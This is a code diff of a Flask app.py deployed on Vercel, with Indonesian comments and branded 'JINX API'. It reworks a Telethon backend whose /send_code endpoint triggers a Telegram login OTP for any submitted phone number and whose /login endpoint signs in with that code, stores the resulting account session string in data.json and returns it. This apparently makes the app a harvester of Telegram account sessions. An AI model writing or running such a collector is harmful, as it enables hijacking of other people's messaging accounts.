@@ -1,14 +1,28 @@
-# app.py — VERCEL
+# app.py — VERCEL (FIX 500 ERROR!)
 from flask import Flask, request, jsonify
-from telethon.sync import TelegramClient
-from telethon.sessions import StringSession
-import os, json
+import os, json, traceback
 
 app = Flask(__name__)
 
+# BACA DARI FILE
+def get_session_string():
+    if os.path.exists('session.txt'):
+        with open('session.txt', 'r') as f:
+            return f.read().strip()
+    return None
+
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
-SESSION_STRING = os.getenv('SESSION_STRING')
+SESSION_STRING = get_session_string()
+
+# CEK
+if not SESSION_STRING:
+    @app.route('/', methods=['GET', 'POST'])
+    def no_session():
+        return jsonify({'error': 'session.txt KOSONG!'}), 500
+
+from telethon.sync import TelegramClient
+from telethon.sessions import StringSession
 
 DATA_FILE = 'data.json'
 
@@ -22,41 +36,31 @@ def save(data):
     with open(DATA_FILE, 'w') as f:
         json.dump(data, f, indent=2)
 
-# HOME PAGE — TESTER
 @app.route('/', methods=['GET'])
 def home():
     return """
     <h1 style="color:green;">JINX API JALAN!</h1>
-    <p><b>POST</b> ke <code>/send_code</code> → Kirim OTP</p>
-    <p><b>POST</b> ke <code>/login</code> → Login + Simpan Session</p>
-    <hr>
-    <h3>TESTER CEPAT (PAKE BROWSER)</h3>
     <form action="/send_code" method="post">
-      <input type="text" name="phone" placeholder="+628123456789" required>
-      <button type="submit">Kirim OTP</button>
+      <input name="phone" placeholder="+628..." required>
+      <button>Kirim OTP</button>
     </form>
     """
 
-# KIRIM OTP
 @app.route('/send_code', methods=['POST'])
 def send_code():
     phone = request.form.get('phone')
     if not phone:
         return jsonify({'success': False, 'error': 'no phone'})
-    if not SESSION_STRING:
-        return jsonify({'success': False, 'error': 'SESSION_STRING missing'})
 
-    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-    client.connect()
     try:
+        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
+        client.connect()
         res = client.send_code_request(phone)
         client.disconnect()
         return jsonify({'success': True, 'hash': res.phone_code_hash})
     except Exception as e:
-        client.disconnect()
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)}), 500
 
-# LOGIN
 @app.route('/login', methods=['POST'])
 def login():
     phone = request.form.get('phone')
@@ -65,9 +69,9 @@ def login():
     if not all([phone, code, hash_code]):
         return jsonify({'success': False, 'error': 'missing'})
 
-    client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
-    client.connect()
     try:
+        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
+        client.connect()
         client.sign_in(phone, code=code, phone_code_hash=hash_code)
         sess = client.session.save()
         data = load()
@@ -76,8 +80,7 @@ def login():
         client.disconnect()
         return jsonify({'success': True, 'session': sess})
     except Exception as e:
-        client.disconnect()
-        return jsonify({'success': False, 'error': str(e)})
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 if __name__ == "__main__":
     app.run()
